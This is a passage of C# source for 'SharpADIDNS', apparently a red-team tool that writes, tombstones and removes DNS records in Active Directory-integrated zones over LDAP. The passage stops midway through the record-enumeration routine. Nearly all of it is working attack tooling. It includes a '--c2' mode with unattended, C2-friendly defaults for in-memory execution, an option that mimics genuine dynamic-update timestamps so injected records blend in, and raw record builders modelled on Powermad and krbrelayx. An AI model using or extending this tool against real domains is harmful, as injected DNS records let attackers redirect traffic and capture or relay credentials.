using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;

namespace SharpADIDNS
{
    // -----------------------------------------------------------------------
    // Exit codes
    // -----------------------------------------------------------------------
    internal static class ExitCodes
    {
        public const int Success      = 0;
        public const int UsageError   = 1;
        public const int LdapError    = 2;
        public const int NotFound     = 3;
        public const int AccessDenied = 4;
    }

    // -----------------------------------------------------------------------
    // Entry point
    // -----------------------------------------------------------------------
    internal static class Program
    {
        public const string Version = "0.4.0";

        private static int Main(string[] args)
        {
            try
            {
                if (args == null || args.Length == 0)
                {
                    Options.PrintUsage();
                    return ExitCodes.UsageError;
                }

                Options opt = Options.Parse(args);

                // --c2 forces a coherent set of in-memory / unattended defaults.
                // Explicit flags on the same command line still apply on top of
                // these (e.g. --c2 --format text would still produce text), but
                // any non-set default flips to the C2-friendly value.
                if (opt.C2)
                {
                    opt.AllowCleartextPassword = true;
                    opt.Yes                    = true;
                    opt.NoColor                = true;
                    opt.Quiet                  = true;
                    if (opt.Format == "text")   opt.Format   = "json";
                    if (string.IsNullOrEmpty(opt.BackupTo)) opt.BackupTo = "-";
                }

                Logger.ColorEnabled = opt.NoColor ? false :
                                      opt.Color ? true :
                                      !Console.IsOutputRedirected;

                if (opt.ShowVersion)
                {
                    Console.WriteLine("SharpADIDNS v" + Version);
                    return ExitCodes.Success;
                }

                if (opt.ShowHelp)
                {
                    Options.PrintUsage();
                    return ExitCodes.Success;
                }

                if (string.IsNullOrWhiteSpace(opt.DomainDn))
                {
                    Logger.Err("--dn is required");
                    return ExitCodes.UsageError;
                }

                Credentials.Resolve(opt);

                if (Replication.CheckBeforeAction(opt) != ExitCodes.Success)
                    return ExitCodes.UsageError;

                // Script mode: one execute-assembly invocation runs multiple
                // actions. Outer flags become defaults; each statement can
                // override. Outer must not also specify a top-level action.
                if (!string.IsNullOrEmpty(opt.Script))
                {
                    if (!string.IsNullOrEmpty(opt.Action))
                    {
                        Logger.Err("--script is incompatible with a top-level action verb");
                        return ExitCodes.UsageError;
                    }
                    return RunScript(opt);
                }

                return DispatchAction(opt);
            }
            catch (DirectoryServicesCOMException ex)
            {
                ErrorReporter.PrintCom(ex);
                return ErrorReporter.ToExitCode(ex);
            }
            catch (ArgumentException ex)
            {
                Logger.Err("{0}", ex.Message);
                return ExitCodes.UsageError;
            }
            catch (FormatException ex)
            {
                Logger.Err("Format error: {0}", ex.Message);
                return ExitCodes.UsageError;
            }
            catch (Exception ex)
            {
                Logger.Err("Error: {0}", ex.Message);
                if (ex.InnerException != null)
                    Logger.Err("Inner: {0}", ex.InnerException.Message);
                return ExitCodes.LdapError;
            }
        }

        private static int RequireName(Options opt)
        {
            if (string.IsNullOrWhiteSpace(opt.Name))
            {
                Logger.Err("{0} requires --name <label>", opt.Action);
                return 1;
            }
            return 0;
        }

        private static int DispatchAction(Options opt)
        {
            if (string.IsNullOrWhiteSpace(opt.Action))
            {
                Logger.Err("No action specified (expected: enum | query | add | disable | remove | list-zones)");
                return ExitCodes.UsageError;
            }

            bool needsZone = opt.Action != "list-zones";

            if (needsZone && string.IsNullOrWhiteSpace(opt.Zone))
            {
                Logger.Err("--zone is required");
                return ExitCodes.UsageError;
            }

            string zoneDn = needsZone ? LdapOps.BuildZoneDn(opt.Zone, opt.Partition, opt.DomainDn) : null;

            Logger.Verbose(opt, "Action:     {0}", opt.Action);
            if (zoneDn != null)
                Logger.Verbose(opt, "Zone DN:    {0}", zoneDn);
            if (!string.IsNullOrWhiteSpace(opt.Server))
                Logger.Verbose(opt, "LDAP DC:    {0}", opt.Server);
            if (!string.IsNullOrWhiteSpace(opt.Username))
                Logger.Verbose(opt, "Bind user:  {0}", opt.Username);
            Logger.Verbose(opt, "Transport:  {0}", opt.Ldaps ? "LDAPS (port 636)" : "LDAP (port 389)");

            switch (opt.Action)
            {
                case "enum":
                    return Actions.RunEnum(opt, zoneDn);

                case "query":
                    if (RequireName(opt) != 0) return ExitCodes.UsageError;
                    return Actions.RunQuery(opt, zoneDn);

                case "list-zones":
                    return Actions.RunListZones(opt);

                case "add":
                    if (RequireName(opt) != 0) return ExitCodes.UsageError;
                    if (string.IsNullOrWhiteSpace(opt.Data) && string.IsNullOrWhiteSpace(opt.RawBase64))
                    {
                        Logger.Err("add requires --data <value> or --raw <base64>");
                        return ExitCodes.UsageError;
                    }
                    return Actions.RunAdd(opt, zoneDn);

                case "disable":
                    if (RequireName(opt) != 0) return ExitCodes.UsageError;
                    return Actions.RunDisable(opt, zoneDn);

                case "remove":
                    if (RequireName(opt) != 0) return ExitCodes.UsageError;
                    return Actions.RunRemove(opt, zoneDn);

                default:
                    Logger.Err("Unknown action: {0}", opt.Action);
                    return ExitCodes.UsageError;
            }
        }

        private static int RunScript(Options outerOpt)
        {
            string[] rawStmts = outerOpt.Script.Split(';');
            int total = 0, succeeded = 0, failed = 0;
            bool halt = outerOpt.ScriptOnError == "halt";

            foreach (string raw in rawStmts)
            {
                string stmt = raw.Trim();
                if (stmt.Length == 0) continue;
                total++;

                string[] tokens = stmt.Split(
                    new[] { ' ', '\t' }, StringSplitOptions.RemoveEmptyEntries);

                Options stmtOpt = outerOpt.Clone();
                ResetActionScopedFields(stmtOpt);

                try
                {
                    Options.ApplyArgs(stmtOpt, tokens);
                    int rc = DispatchAction(stmtOpt);
                    if (rc == ExitCodes.Success)
                    {
                        succeeded++;
                    }
                    else
                    {
                        failed++;
                        Logger.Err("Statement {0} failed with exit code {1}: {2}", total, rc, stmt);
                        if (halt) break;
                    }
                }
                catch (DirectoryServicesCOMException ex)
                {
                    failed++;
                    ErrorReporter.PrintCom(ex);
                    if (halt) break;
                }
                catch (ArgumentException ex)
                {
                    failed++;
                    Logger.Err("Statement {0}: {1}", total, ex.Message);
                    if (halt) break;
                }
            }

            if (outerOpt.Format == "json")
            {
                Console.WriteLine(
                    "{\"_type\":\"script_summary\",\"total\":" + total +
                    ",\"succeeded\":" + succeeded +
                    ",\"failed\":" + failed +
                    ",\"on_error\":\"" + outerOpt.ScriptOnError + "\"}");
            }
            else
            {
                Logger.Ok("Script: {0}/{1} succeeded, {2} failed (on-error: {3})",
                    succeeded, total, failed, outerOpt.ScriptOnError);
            }

            return failed == 0 ? ExitCodes.Success : ExitCodes.LdapError;
        }

        private static void ResetActionScopedFields(Options o)
        {
            o.Action       = null;
            o.Name         = null;
            o.Data         = null;
            o.RawBase64    = null;
            o.Force        = false;
            o.Append       = false;
            o.MimicAging   = false;
            o.SetOwner     = null;
            o.RecordType   = "A";
            o.SrvPriority  = 0;
            o.SrvWeight    = 0;
            o.SrvPort      = -1;
            o.MxPref       = 10;
            o.FilterType   = null;
            o.FilterName   = null;
            o.OnlyTombstoned = false;
            o.NoTombstoned = false;
            o.Script       = null;
        }
    }

    // -----------------------------------------------------------------------
    // Output helpers (respect --quiet / --verbose; ANSI color when enabled)
    // -----------------------------------------------------------------------
    internal static class Logger
    {
        public static bool ColorEnabled = false;

        private const string Reset    = "[0m";
        private const string FgGreen  = "[32m";
        private const string FgRed    = "[31m";
        private const string FgYellow = "[33m";
        private const string FgCyan   = "[36m";
        private const string FgGray   = "[90m";

        private static string Mark(string ansi, string text)
        {
            return ColorEnabled ? ansi + text + Reset : text;
        }

        public static void Info(Options opt, string fmt, params object[] args)
        {
            if (opt != null && opt.Quiet) return;
            Console.WriteLine(Mark(FgCyan, "[*]") + " " + fmt, args);
        }

        public static void Ok(string fmt, params object[] args)
        {
            Console.WriteLine(Mark(FgGreen, "[+]") + " " + fmt, args);
        }

        public static void Verbose(Options opt, string fmt, params object[] args)
        {
            if (opt == null || !opt.Verbose) return;
            Console.WriteLine(Mark(FgGray, "[v]") + " " + fmt, args);
        }

        public static void Warn(string fmt, params object[] args)
        {
            Console.Error.WriteLine(Mark(FgYellow, "[!]") + " " + fmt, args);
        }

        public static void Err(string fmt, params object[] args)
        {
            Console.Error.WriteLine(Mark(FgRed, "[-]") + " " + fmt, args);
        }
    }

    // -----------------------------------------------------------------------
    // LDAP helpers
    // -----------------------------------------------------------------------
    internal static class LdapOps
    {
        public static string BuildZoneDn(string zone, string partition, string domainDn)
        {
            if (partition.Equals("DomainDnsZones", StringComparison.OrdinalIgnoreCase))
                return "DC=" + EscapeRdn(zone) + ",CN=MicrosoftDNS,DC=DomainDnsZones," + domainDn;
            if (partition.Equals("ForestDnsZones", StringComparison.OrdinalIgnoreCase))
                return "DC=" + EscapeRdn(zone) + ",CN=MicrosoftDNS,DC=ForestDnsZones," + domainDn;
            if (partition.Equals("System", StringComparison.OrdinalIgnoreCase))
                return "DC=" + EscapeRdn(zone) + ",CN=MicrosoftDNS,CN=System," + domainDn;
            throw new ArgumentException(
                "Unsupported --partition: " + partition +
                " (expected DomainDnsZones, ForestDnsZones, or System)");
        }

        public static string BuildContainerDn(string partition, string domainDn)
        {
            if (partition.Equals("DomainDnsZones", StringComparison.OrdinalIgnoreCase))
                return "CN=MicrosoftDNS,DC=DomainDnsZones," + domainDn;
            if (partition.Equals("ForestDnsZones", StringComparison.OrdinalIgnoreCase))
                return "CN=MicrosoftDNS,DC=ForestDnsZones," + domainDn;
            if (partition.Equals("System", StringComparison.OrdinalIgnoreCase))
                return "CN=MicrosoftDNS,CN=System," + domainDn;
            throw new ArgumentException(
                "Unsupported --partition: " + partition +
                " (expected DomainDnsZones, ForestDnsZones, or System)");
        }

        public static string Path(Options opt, string dn)
        {
            if (string.IsNullOrWhiteSpace(opt.Server))
                return "LDAP://" + dn;
            return "LDAP://" + opt.Server + "/" + dn;
        }

        public static AuthenticationTypes Auth(Options opt)
        {
            AuthenticationTypes t = AuthenticationTypes.Secure;
            if (opt.Ldaps) t |= AuthenticationTypes.SecureSocketsLayer;
            if (!string.IsNullOrWhiteSpace(opt.Server)) t |= AuthenticationTypes.ServerBind;
            return t;
        }

        public static DirectoryEntry Open(Options opt, string dn)
        {
            string path = Path(opt, dn);
            if (string.IsNullOrWhiteSpace(opt.Username))
                return new DirectoryEntry(path, null, null, Auth(opt));
            return new DirectoryEntry(path, opt.Username, opt.Password, Auth(opt));
        }

        public static bool TryBind(DirectoryEntry entry, out DirectoryServicesCOMException error)
        {
            try
            {
                object _ = entry.NativeObject;
                error = null;
                return true;
            }
            catch (DirectoryServicesCOMException ex)
            {
                error = ex;
                return false;
            }
        }

        public static string EscapeRdn(string value)
        {
            // RFC 4514 RDN escapes plus the leading '#' and trailing ' ' cases
            // are handled by the directory at write time; we cover the chars
            // that show up inside DNS labels people put on the CLI.
            return value.Replace("\\", "\\5c")
                        .Replace(",", "\\2c")
                        .Replace("+", "\\2b")
                        .Replace("\"", "\\22")
                        .Replace("<", "\\3c")
                        .Replace(">", "\\3e")
                        .Replace(";", "\\3b")
                        .Replace("=", "\\3d")
                        .Replace("#", "\\23");
        }
    }

    // -----------------------------------------------------------------------
    // DirectoryServicesCOMException dissection
    // -----------------------------------------------------------------------
    internal static class ErrorReporter
    {
        // ADSI HRESULTs (winerror.h / activeds.h)
        private const int LDAP_NO_SUCH_OBJECT       = unchecked((int)0x80072030);
        private const int LDAP_INSUFFICIENT_RIGHTS  = unchecked((int)0x80072098);
        private const int LDAP_ALREADY_EXISTS       = unchecked((int)0x80071392);
        private const int LDAP_INVALID_CREDENTIALS  = unchecked((int)0x8007052E);
        private const int LDAP_SERVER_DOWN          = unchecked((int)0x8007203A);
        private const int E_ACCESSDENIED            = unchecked((int)0x80070005);

        public static bool IsNotFound(DirectoryServicesCOMException ex)
        {
            return ex != null && ex.ErrorCode == LDAP_NO_SUCH_OBJECT;
        }

        public static bool IsAccessDenied(DirectoryServicesCOMException ex)
        {
            if (ex == null) return false;
            return ex.ErrorCode == LDAP_INSUFFICIENT_RIGHTS
                || ex.ErrorCode == E_ACCESSDENIED
                || ex.ErrorCode == LDAP_INVALID_CREDENTIALS;
        }

        public static bool IsAlreadyExists(DirectoryServicesCOMException ex)
        {
            return ex != null && ex.ErrorCode == LDAP_ALREADY_EXISTS;
        }

        public static int ToExitCode(DirectoryServicesCOMException ex)
        {
            if (IsNotFound(ex))     return ExitCodes.NotFound;
            if (IsAccessDenied(ex)) return ExitCodes.AccessDenied;
            return ExitCodes.LdapError;
        }

        public static void PrintCom(DirectoryServicesCOMException ex)
        {
            Logger.Err("LDAP error: {0}", ex.Message);
            Console.Error.WriteLine("[-]   HRESULT:       0x{0:X8}", ex.ErrorCode);
            if (ex.ExtendedError != 0)
                Console.Error.WriteLine("[-]   ExtendedError: 0x{0:X} ({0})", ex.ExtendedError);
            if (!string.IsNullOrEmpty(ex.ExtendedErrorMessage))
                Console.Error.WriteLine("[-]   ExtendedMsg:   {0}", ex.ExtendedErrorMessage);
        }
    }

    // -----------------------------------------------------------------------
    // dnsRecord blob builders and parser (MS-DNSP DNS_RPC_RECORD)
    // -----------------------------------------------------------------------
    internal static class DnsRecord
    {
        public const ushort TypeZero  = 0x0000; // tombstone
        public const ushort TypeA     = 0x0001;
        public const ushort TypeNs    = 0x0002;
        public const ushort TypeCname = 0x0005;
        public const ushort TypeSoa   = 0x0006;
        public const ushort TypePtr   = 0x000C;
        public const ushort TypeMx    = 0x000F;
        public const ushort TypeTxt   = 0x0010;
        public const ushort TypeAaaa  = 0x001C;
        public const ushort TypeSrv   = 0x0021;

        public static string TypeName(ushort t)
        {
            switch (t)
            {
                case TypeZero:  return "TS";
                case TypeA:     return "A";
                case TypeNs:    return "NS";
                case TypeCname: return "CNAME";
                case TypeSoa:   return "SOA";
                case TypePtr:   return "PTR";
                case TypeMx:    return "MX";
                case TypeTxt:   return "TXT";
                case TypeAaaa:  return "AAAA";
                case TypeSrv:   return "SRV";
                default:        return "Type" + t;
            }
        }

        public static ushort GetType(byte[] data)
        {
            if (data == null || data.Length < 4) return 0xFFFF;
            return Bin.ReadU16Le(data, 2);
        }

        public static byte[] BuildA(IPAddress ip, int ttl, uint timestamp = 0)
        {
            if (ip.AddressFamily != AddressFamily.InterNetwork)
                throw new ArgumentException("BuildA requires an IPv4 address");
            byte[] data = ip.GetAddressBytes();
            return BuildHeader(TypeA, data, ttl, timestamp);
        }

        public static byte[] BuildAaaa(IPAddress ip, int ttl, uint timestamp = 0)
        {
            if (ip.AddressFamily != AddressFamily.InterNetworkV6)
                throw new ArgumentException("BuildAaaa requires an IPv6 address");
            byte[] data = ip.GetAddressBytes();
            return BuildHeader(TypeAaaa, data, ttl, timestamp);
        }

        public static byte[] BuildCname(string target, int ttl, uint timestamp = 0)
        {
            if (string.IsNullOrWhiteSpace(target))
                throw new ArgumentException("CNAME target cannot be empty");
            byte[] data = EncodeCountName(target);
            return BuildHeader(TypeCname, data, ttl, timestamp);
        }

        public static byte[] BuildTxt(string text, int ttl, uint timestamp = 0)
        {
            if (text == null) text = "";
            byte[] raw = Encoding.ASCII.GetBytes(text);
            if (raw.Length > 255)
                throw new ArgumentException(
                    "TXT data exceeds 255 bytes; use --raw to inject multi-string TXT");
            byte[] data = new byte[1 + raw.Length];
            data[0] = (byte)raw.Length;
            Buffer.BlockCopy(raw, 0, data, 1, raw.Length);
            return BuildHeader(TypeTxt, data, ttl, timestamp);
        }

        public static byte[] BuildPtr(string target, int ttl, uint timestamp = 0)
        {
            if (string.IsNullOrWhiteSpace(target))
                throw new ArgumentException("PTR target cannot be empty");
            byte[] data = EncodeCountName(target);
            return BuildHeader(TypePtr, data, ttl, timestamp);
        }

        public static byte[] BuildSrv(ushort priority, ushort weight, ushort port,
                                      string target, int ttl, uint timestamp = 0)
        {
            if (string.IsNullOrWhiteSpace(target))
                throw new ArgumentException("SRV target cannot be empty");
            byte[] name = EncodeCountName(target);
            byte[] data = new byte[6 + name.Length];
            Bin.WriteU16Be(data, 0, priority);
            Bin.WriteU16Be(data, 2, weight);
            Bin.WriteU16Be(data, 4, port);
            Buffer.BlockCopy(name, 0, data, 6, name.Length);
            return BuildHeader(TypeSrv, data, ttl, timestamp);
        }

        public static byte[] BuildMx(ushort preference, string exchange, int ttl, uint timestamp = 0)
        {
            if (string.IsNullOrWhiteSpace(exchange))
                throw new ArgumentException("MX exchange cannot be empty");
            byte[] name = EncodeCountName(exchange);
            byte[] data = new byte[2 + name.Length];
            Bin.WriteU16Be(data, 0, preference);
            Buffer.BlockCopy(name, 0, data, 2, name.Length);
            return BuildHeader(TypeMx, data, ttl, timestamp);
        }

        public static uint AgingTimestampNow()
        {
            // Hours since 1601-01-01 00:00:00 UTC (the AD "aging timestamp" base).
            // Matches the value a real DDNS update would write.
            DateTime epoch = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            double hours = (DateTime.UtcNow - epoch).TotalHours;
            return (uint)hours;
        }

        public static byte[] BuildTombstone()
        {
            // DNS_RPC_RECORD_TS per MS-DNSP: type=0, datalen=8, data = EntombedTime FILETIME LE
            long ft = DateTime.UtcNow.ToFileTimeUtc();
            byte[] data = BitConverter.GetBytes(ft);
            if (!BitConverter.IsLittleEndian) Array.Reverse(data);
            return BuildHeader(TypeZero, data, 0);
        }

        private static byte[] BuildHeader(ushort type, byte[] data, int ttl, uint timestamp = 0)
        {
            byte[] record = new byte[24 + data.Length];
            Bin.WriteU16Le(record, 0, (ushort)data.Length);   // DataLength
            Bin.WriteU16Le(record, 2, type);                  // Type
            record[4] = 0x05;                                 // Version
            record[5] = 0xF0;                                 // Rank = DNS_RANK_ZONE
            Bin.WriteU16Le(record, 6, 0);                     // Flags
            Bin.WriteU32Le(record, 8, 1);                     // Serial
            Bin.WriteU32Be(record, 12, (uint)ttl);            // TTL (big-endian)
            Bin.WriteU32Le(record, 16, 0);                    // Reserved
            Bin.WriteU32Le(record, 20, timestamp);            // Timestamp: 0=static, else hours-since-1601
            Buffer.BlockCopy(data, 0, record, 24, data.Length);
            return record;
        }

        // DNS_COUNT_NAME per MS-DNSP 2.2.2.2.2 (matches Powermad / krbrelayx)
        private static byte[] EncodeCountName(string name)
        {
            if (name.EndsWith("."))
                name = name.Substring(0, name.Length - 1);
            string[] labels = name.Split('.');

            using (MemoryStream ms = new MemoryStream())
            {
                foreach (string label in labels)
                {
                    byte[] lbl = Encoding.ASCII.GetBytes(label);
                    if (lbl.Length == 0)
                        throw new ArgumentException("Empty DNS label in: " + name);
                    if (lbl.Length > 63)
                        throw new ArgumentException("DNS label exceeds 63 bytes: " + label);
                    ms.WriteByte((byte)lbl.Length);
                    ms.Write(lbl, 0, lbl.Length);
                }
                ms.WriteByte(0);

                byte[] body = ms.ToArray();
                if (body.Length > 255)
                    throw new ArgumentException("Encoded DNS name exceeds 255 bytes: " + name);

                byte[] result = new byte[2 + body.Length];
                result[0] = (byte)body.Length;     // cchNameLength
                result[1] = (byte)labels.Length;   // bLabelCount
                Buffer.BlockCopy(body, 0, result, 2, body.Length);
                return result;
            }
        }

        public static string DecodeCountName(byte[] data, int offset)
        {
            if (offset + 2 > data.Length) return "<short>";
            byte count = data[offset + 1];
            int p = offset + 2;
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < count; i++)
            {
                if (p >= data.Length) break;
                byte len = data[p++];
                if (len == 0) break;
                if (p + len > data.Length) break;
                if (sb.Length > 0) sb.Append('.');
                sb.Append(Encoding.ASCII.GetString(data, p, len));
                p += len;
            }
            return sb.ToString();
        }

        public static string DecodeTxt(byte[] data, int offset, int len)
        {
            StringBuilder sb = new StringBuilder();
            int end = offset + len;
            int p = offset;
            while (p < end)
            {
                byte s = data[p++];
                if (p + s > end) break;
                if (sb.Length > 0) sb.Append(" | ");
                sb.Append(Encoding.ASCII.GetString(data, p, s));
                p += s;
            }
            return sb.ToString();
        }

        public static string SummaryLine(byte[] data)
        {
            if (data == null || data.Length < 24) return "<short>";
            ushort type = GetType(data);
            ushort dataLength = Bin.ReadU16Le(data, 0);
            uint ttl = Bin.ReadU32Be(data, 12);

            string val;
            switch (type)
            {
                case TypeA:
                    val = (data.Length >= 28)
                        ? string.Format("{0}.{1}.{2}.{3}", data[24], data[25], data[26], data[27])
                        : "<malformed>";
                    break;
                case TypeAaaa:
                    if (dataLength == 16 && data.Length >= 40)
                    {
                        byte[] addr = new byte[16];
                        Buffer.BlockCopy(data, 24, addr, 0, 16);
                        val = new IPAddress(addr).ToString();
                    }
                    else val = "<malformed>";
                    break;
                case TypeCname:
                case TypePtr:
                case TypeNs:
                    val = DecodeCountName(data, 24);
                    break;
                case TypeTxt:
                    val = "\"" + DecodeTxt(data, 24, dataLength) + "\"";
                    break;
                case TypeSrv:
                    if (dataLength >= 6 && data.Length >= 30)
                    {
                        ushort sPri = Bin.ReadU16Be(data, 24);
                        ushort sWt  = Bin.ReadU16Be(data, 26);
                        ushort sPort = Bin.ReadU16Be(data, 28);
                        string sTarget = DecodeCountName(data, 30);
                        val = sPri + " " + sWt + " " + sPort + " " + sTarget;
                    }
                    else val = "<malformed>";
                    break;
                case TypeMx:
                    if (dataLength >= 2 && data.Length >= 26)
                    {
                        ushort pref = Bin.ReadU16Be(data, 24);
                        string exchange = DecodeCountName(data, 26);
                        val = pref + " " + exchange;
                    }
                    else val = "<malformed>";
                    break;
                case TypeZero:
                    val = "<tombstone>";
                    break;
                default:
                    val = "<" + dataLength + " bytes>";
                    break;
            }
            return string.Format("{0} (ttl={1})", val, ttl);
        }

        public static void Decode(byte[] data, string indent)
        {
            if (data.Length < 24)
            {
                Console.WriteLine("{0}<record too short: {1} bytes>", indent, data.Length);
                return;
            }

            ushort dataLength = Bin.ReadU16Le(data, 0);
            ushort type       = Bin.ReadU16Le(data, 2);
            byte version      = data[4];
            byte rank         = data[5];
            ushort flags      = Bin.ReadU16Le(data, 6);
            uint serial       = Bin.ReadU32Le(data, 8);
            uint ttl          = Bin.ReadU32Be(data, 12);
            uint reserved     = Bin.ReadU32Le(data, 16);
            uint timestamp    = Bin.ReadU32Le(data, 20);

            Console.WriteLine("{0}Type:       {1} ({2})", indent, TypeName(type), type);
            Console.WriteLine("{0}DataLength: {1}", indent, dataLength);
            Console.WriteLine("{0}Version:    {1}", indent, version);
            Console.WriteLine("{0}Rank:       0x{1:X2}", indent, rank);
            Console.WriteLine("{0}Flags:      0x{1:X4}", indent, flags);
            Console.WriteLine("{0}Serial:     {1}", indent, serial);
            Console.WriteLine("{0}TTL:        {1}", indent, ttl);
            Console.WriteLine("{0}Timestamp:  {1}{2}", indent, timestamp,
                timestamp == 0 ? " (static)" : " (hours since 1601-01-01)");

            if (data.Length < 24 + dataLength) return;

            switch (type)
            {
                case TypeA:
                    if (dataLength == 4 && data.Length >= 28)
                        Console.WriteLine("{0}A:          {1}.{2}.{3}.{4}",
                            indent, data[24], data[25], data[26], data[27]);
                    break;
                case TypeAaaa:
                    if (dataLength == 16 && data.Length >= 40)
                    {
                        byte[] addr = new byte[16];
                        Buffer.BlockCopy(data, 24, addr, 0, 16);
                        Console.WriteLine("{0}AAAA:       {1}", indent, new IPAddress(addr));
                    }
                    break;
                case TypeCname:
                    Console.WriteLine("{0}CNAME:      {1}", indent, DecodeCountName(data, 24));
                    break;
                case TypePtr:
                    Console.WriteLine("{0}PTR:        {1}", indent, DecodeCountName(data, 24));
                    break;
                case TypeNs:
                    Console.WriteLine("{0}NS:         {1}", indent, DecodeCountName(data, 24));
                    break;
                case TypeTxt:
                    Console.WriteLine("{0}TXT:        \"{1}\"", indent, DecodeTxt(data, 24, dataLength));
                    break;
                case TypeSrv:
                    if (dataLength >= 6 && data.Length >= 30)
                    {
                        ushort sPri = Bin.ReadU16Be(data, 24);
                        ushort sWt  = Bin.ReadU16Be(data, 26);
                        ushort sPort = Bin.ReadU16Be(data, 28);
                        string sTarget = DecodeCountName(data, 30);
                        Console.WriteLine("{0}SRV:        priority={1} weight={2} port={3} target={4}",
                            indent, sPri, sWt, sPort, sTarget);
                    }
                    break;
                case TypeMx:
                    if (dataLength >= 2 && data.Length >= 26)
                    {
                        ushort pref = Bin.ReadU16Be(data, 24);
                        string exchange = DecodeCountName(data, 26);
                        Console.WriteLine("{0}MX:         preference={1} exchange={2}",
                            indent, pref, exchange);
                    }
                    break;
                case TypeZero:
                    if (dataLength == 8)
                    {
                        long ft = (long)Bin.ReadU64Le(data, 24);
                        try
                        {
                            DateTime dt = DateTime.FromFileTimeUtc(ft);
                            Console.WriteLine("{0}Entombed:   {1:u}", indent, dt);
                        }
                        catch
                        {
                            Console.WriteLine("{0}EntombedRaw: 0x{1:X16}", indent, ft);
                        }
                    }
                    break;
                default:
                    byte[] raw = new byte[dataLength];
                    Buffer.BlockCopy(data, 24, raw, 0, dataLength);
                    Console.WriteLine("{0}RawData:    {1}", indent, BitConverter.ToString(raw).Replace("-", ""));
                    break;
            }
        }
    }

    // -----------------------------------------------------------------------
    // Endian helpers
    // -----------------------------------------------------------------------
    internal static class Bin
    {
        public static void WriteU16Le(byte[] b, int o, ushort v)
        {
            b[o]     = (byte)(v & 0xff);
            b[o + 1] = (byte)((v >> 8) & 0xff);
        }

        public static void WriteU16Be(byte[] b, int o, ushort v)
        {
            b[o]     = (byte)((v >> 8) & 0xff);
            b[o + 1] = (byte)(v & 0xff);
        }

        public static void WriteU32Le(byte[] b, int o, uint v)
        {
            b[o]     = (byte)(v & 0xff);
            b[o + 1] = (byte)((v >> 8) & 0xff);
            b[o + 2] = (byte)((v >> 16) & 0xff);
            b[o + 3] = (byte)((v >> 24) & 0xff);
        }

        public static void WriteU32Be(byte[] b, int o, uint v)
        {
            b[o]     = (byte)((v >> 24) & 0xff);
            b[o + 1] = (byte)((v >> 16) & 0xff);
            b[o + 2] = (byte)((v >> 8) & 0xff);
            b[o + 3] = (byte)(v & 0xff);
        }

        public static ushort ReadU16Le(byte[] b, int o)
        {
            return (ushort)(b[o] | (b[o + 1] << 8));
        }

        public static ushort ReadU16Be(byte[] b, int o)
        {
            return (ushort)((b[o] << 8) | b[o + 1]);
        }

        public static uint ReadU32Le(byte[] b, int o)
        {
            return (uint)(b[o]
                       | (b[o + 1] << 8)
                       | (b[o + 2] << 16)
                       | (b[o + 3] << 24));
        }

        public static uint ReadU32Be(byte[] b, int o)
        {
            return (uint)((b[o] << 24)
                       | (b[o + 1] << 16)
                       | (b[o + 2] << 8)
                       |  b[o + 3]);
        }

        public static ulong ReadU64Le(byte[] b, int o)
        {
            ulong lo = ReadU32Le(b, o);
            ulong hi = ReadU32Le(b, o + 4);
            return lo | (hi << 32);
        }
    }

    // -----------------------------------------------------------------------
    // Action runners
    // -----------------------------------------------------------------------
    internal static class Actions
    {
        // ------------- list-zones -------------
        public static int RunListZones(Options opt)
        {
            if (opt.Format != "text" && opt.Format != "json")
                throw new ArgumentException("--format must be 'text' or 'json'");
            bool jsonMode = opt.Format == "json";

            string[] partitions = { "DomainDnsZones", "ForestDnsZones", "System" };
            int total = 0;

            StringBuilder json = null;
            bool firstZone = true;
            if (jsonMode)
            {
                json = new StringBuilder();
                json.Append("{\"zones\":[");
            }

            foreach (string partition in partitions)
            {
                string containerDn = LdapOps.BuildContainerDn(partition, opt.DomainDn);
                Logger.Verbose(opt, "Searching: {0}", containerDn);

                using (DirectoryEntry container = LdapOps.Open(opt, containerDn))
                {
                    DirectoryServicesCOMException err;
                    if (!LdapOps.TryBind(container, out err))
                    {
                        if (ErrorReporter.IsNotFound(err))
                        {
                            Logger.Verbose(opt, "Partition not present at this DN: {0}", partition);
                            continue;
                        }
                        Logger.Warn("Could not search partition {0}: {1}", partition, err.Message);
                        continue;
                    }

                    using (DirectorySearcher searcher = new DirectorySearcher(container))
                    {
                        searcher.Filter = "(objectClass=dnsZone)";
                        searcher.SearchScope = SearchScope.OneLevel;
                        searcher.PageSize = 1000;
                        searcher.PropertiesToLoad.Add("name");
                        searcher.PropertiesToLoad.Add("distinguishedName");
                        searcher.PropertiesToLoad.Add("whenCreated");

                        using (SearchResultCollection results = searcher.FindAll())
                        {
                            foreach (SearchResult r in results)
                            {
                                string name = Prop(r, "name");
                                string dn   = Prop(r, "distinguishedName");
                                string when = Prop(r, "whenCreated");
                                total++;

                                if (jsonMode)
                                {
                                    if (!firstZone) json.Append(",");
                                    firstZone = false;
                                    json.Append("{");
                                    json.AppendFormat("\"name\":\"{0}\",", Json.Escape(name));
                                    json.AppendFormat("\"partition\":\"{0}\",", partition);
                                    json.AppendFormat("\"dn\":\"{0}\",", Json.Escape(dn));
                                    json.AppendFormat("\"whenCreated\":\"{0}\"", Json.Escape(when));
                                    json.Append("}");
                                }
                                else
                                {
                                    Console.WriteLine("[+] {0,-44} partition={1}", name, partition);
                                    if (opt.Verbose)
                                    {
                                        Console.WriteLine("    DN:          {0}", dn);
                                        if (when.Length > 0)
                                            Console.WriteLine("    whenCreated: {0}", when);
                                    }
                                }
                            }
                        }
                    }
                }
            }

            if (jsonMode)
            {
                json.Append("],");
                json.AppendFormat("\"total\":{0}", total);
                json.Append("}");
                Console.WriteLine(json.ToString());
            }
            else
            {
                Console.WriteLine();
                Logger.Ok("Total zones: {0}", total);
            }
            return ExitCodes.Success;
        }

        // ------------- enum -------------
        public static int RunEnum(Options opt, string zoneDn)
        {
            if (opt.Format != "text" && opt.Format != "json")
                throw new ArgumentException("--format must be 'text' or 'json'");
            if (opt.OnlyTombstoned && opt.NoTombstoned)
                throw new ArgumentException("--only-tombstoned and --no-tombstoned are mutually exclusive");

            HashSet<ushort> typeSet = ParseTypeFilter(opt.FilterType);
            Regex nameRegex = string.IsNullOrEmpty(opt.FilterName) ? null : GlobToRegex(opt.FilterName);
            bool jsonMode = opt.Format == "json";

            using (DirectoryEntry zone = LdapOps.Open(opt, zoneDn))
            {
                DirectoryServicesCOMException err;
                if (!LdapOps.TryBind(zone, out err))
                {
                    if (ErrorReporter.IsNotFound(err))
